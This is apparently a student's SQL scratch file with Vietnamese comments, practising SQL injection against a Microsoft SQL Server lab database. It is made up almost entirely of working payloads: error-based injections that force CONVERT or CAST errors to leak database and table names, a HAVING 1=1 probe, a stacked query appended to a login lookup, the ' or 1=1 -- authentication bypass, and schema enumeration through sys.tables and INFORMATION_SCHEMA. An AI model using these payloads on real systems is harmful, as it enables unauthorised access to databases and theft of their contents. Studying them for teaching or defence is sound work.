SELECT * FROM ACCOUNT WHERE Username='' AND 1=CONVERT(INT,DB_NAME(11))

SELECT * FROM ACCOUNT WHERE Username='' AND 1=CAST(DB_NAME(1) AS int)

--Tìm kiếm tables và column đang thực hiện truy vấn trên hệ thống
SELECT * FROM ACCOUNT WHERE Username='' HAVING 1=1

-- Tìm kiếm table bằng ERROR BASED
select CONVERT(int,STRING_AGG(name, ', ')) from DWH_NHOM7.sys.tables 

SELECT * FROM ACCOUNT WHERE Username=''; select CONVERT(int,STRING_AGG(name, ', ')) from DWH_NHOM7.sys.tables-- 

-- Tìm kiếm tên bảng trong database
select top 3 name from ETL_NHOM7.sys.tables


-- Kiểm tra từng kí tự của table_name trong database
SELECT SUBSTRING(table_name,3,1) FROM ETL_NHOM7.information_schema.tables

-- Kiểm tra số cột của tables 
select * from DWH_NHOM7.INFORMATION_SCHEMA.TABLES order by 1

SELECT name FROM sys.databases

SELECT DB_NAME()

--Gom database trong server thành 1 hàng
SELECT STRING_AGG(name, ', ') FROM sys.databases;

SELECT STRING_AGG(name, ', ') FROM ETL_NHOM7.sys.tables;


select CONVERT(int,STRING_AGG(COLUMN_NAME, ', ')) from ETL_NHOM7.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='ETL_SuperStore'

select * from DWH_NHOM7.INFORMATION_SCHEMA.COLUMNS


SELECT * FROM ACCOUNT WHERE Username= ''or 1=1 --trongasdkhjashdgaksdhakjhdkajshd



